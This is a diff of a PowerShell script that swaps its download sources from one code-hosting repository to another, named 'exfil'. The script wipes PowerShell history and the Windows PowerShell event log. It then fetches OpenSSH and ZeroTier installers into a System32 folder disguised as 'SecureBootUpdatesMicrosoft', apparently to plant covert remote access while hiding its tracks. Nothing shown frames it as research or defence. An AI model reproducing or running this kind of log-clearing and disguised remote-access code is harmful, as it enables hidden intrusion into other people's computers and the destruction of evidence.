@@ -5,10 +5,10 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$downloadUrl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/OpenSSHZip.zip"
+$downloadUrl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/OpenSSHZip.zip"
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
-$hashesUrl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/HashesOfCorePrograms.txt"
+$hashesUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/HashesOfCorePrograms.txt"
 function Write-VerboseMessage($message) {
     if ($VerboseOutput) {
         Write-Host $message
@@ -35,10 +35,10 @@ if (-not (Test-Path $destinationPath)) {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
 }
 #Zt Dl
-$downloadUrl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/ZeroTierOne.msi"
+$downloadUrl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/ZeroTierOne.msi"
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
-$hashesUrl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/HashesOfCorePrograms.txt"
+$hashesUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/HashesOfCorePrograms.txt"
 if (-not (Test-Path (Split-Path $destinationPath))) {
     New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
 }
